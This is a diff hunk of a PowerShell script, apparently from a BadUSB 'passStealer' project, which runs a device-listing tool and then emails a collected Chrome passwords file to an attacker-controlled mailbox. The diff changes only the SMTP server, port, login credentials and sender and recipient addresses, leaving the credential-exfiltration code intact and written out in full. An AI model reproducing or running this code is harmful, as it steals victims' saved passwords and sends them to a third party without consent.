@@ -11,13 +11,13 @@ Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/ma
 .\WNetWatcher.exe /stext connected_devices.txt #Create the file for connected devices
 Start-Sleep -Seconds 60 #Wait for 60 seconds (because connected devices file take a minute to be created)
 #Set mail option
-$SMTPServer = 'smtp.yandex.com'
-$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 465)
+$SMTPServer = '127.0.0.1'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 1025)
 $SMTPInfo.EnableSsl = $true
-$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('silvupass@yandex.com', 'TEST12345&') #Email with which you want to send information
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('silvurez@proton.me', 'testrezmdp') #Email with which you want to send information
 $ReportEmail = New-Object System.Net.Mail.MailMessage
-$ReportEmail.From = 'jacopin102@passteal.com' #Email in which you want to receice the information
-$ReportEmail.To.Add('jacopin102@passteal.com') #Email in which you want to receive the information
+$ReportEmail.From = 'jacopin102@gmail.com' #Email in which you want to receice the information
+$ReportEmail.To.Add('jacopin102@gmail.com') #Email in which you want to receive the information
 $ReportEmail.Subject = 'ChromePassStealerV2'
 $ReportEmail.Body = 'Attached is your list of informations.'
 $ReportEmail.Attachments.Add('C:\Users\Public\Documents\passwords.txt')
